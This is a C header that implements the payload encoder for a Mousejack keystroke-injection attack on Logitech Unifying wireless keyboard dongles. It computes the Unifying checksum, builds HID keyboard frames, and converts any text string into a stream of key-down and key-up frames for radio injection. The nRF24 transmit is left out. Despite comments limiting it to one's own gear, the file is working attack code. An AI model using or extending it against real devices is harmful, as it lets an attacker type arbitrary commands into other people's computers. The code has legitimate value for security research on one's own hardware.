// Pure Mousejack / Logitech Unifying frame codec — host-testable.
// The Mousejack class of bugs lets an nRF24 inject keystrokes into unencrypted
// 2.4 GHz keyboard/mouse dongles. This file builds the HID-keyboard payload and
// its checksum; the nRF24 ESB address-sniff + retransmit is bring-up.
// For testing your own peripherals only.
#pragma once
#include "hid_encode.h"     // ascii_to_hid — turn a payload string into HID keys
#include <stdint.h>

// Logitech Unifying packet checksum: every byte (payload + this checksum) sums
// to zero modulo 256, i.e. checksum = two's complement of the payload sum.
static inline uint8_t unifying_checksum(const uint8_t *p, int len) {
  uint8_t sum = 0;
  for (int i = 0; i < len - 1; i++) sum = (uint8_t)(sum + p[i]);
  return (uint8_t)(-(int)sum);
}

// Build a 10-byte Unifying HID keyboard frame (device idx, USB modifier byte,
// one HID usage code) and fill its trailing checksum.
#define UNIFYING_KBD_LEN 10
static inline void mousejack_key(uint8_t dev, uint8_t mods, uint8_t hid_key,
                                 uint8_t out[UNIFYING_KBD_LEN]) {
  out[0] = dev;
  out[1] = 0xC1;                 // frame type: HID keyboard
  out[2] = mods;
  out[3] = hid_key;
  for (int i = 4; i < 9; i++) out[i] = 0x00;   // keys 2..6 unused
  out[9] = unifying_checksum(out, UNIFYING_KBD_LEN);
}

// Build a full keystroke-injection stream for `text`: for each printable char a
// keypress frame followed by a key-release frame (a real dongle needs both, or
// held keys repeat). Fills out[0..count) with up to max_frames Unifying frames.
// Unsupported chars are skipped. Returns the frame count. The nRF24 ESB transmit
// of this stream is bring-up. Authorized/own-gear use only.
static inline int mousejack_stream(uint8_t dev, const char *text,
                                   uint8_t out[][UNIFYING_KBD_LEN], int max_frames) {
  int n = 0;
  for (const char *p = text; *p && n + 1 < max_frames; p++) {
    bool shift;
    uint8_t hid = ascii_to_hid(*p, &shift);
    if (!hid) continue;
    mousejack_key(dev, shift ? 0x02 : 0x00, hid, out[n++]);   // key down
    mousejack_key(dev, 0x00, 0x00, out[n++]);                 // key up (release)
  }
  return n;
}
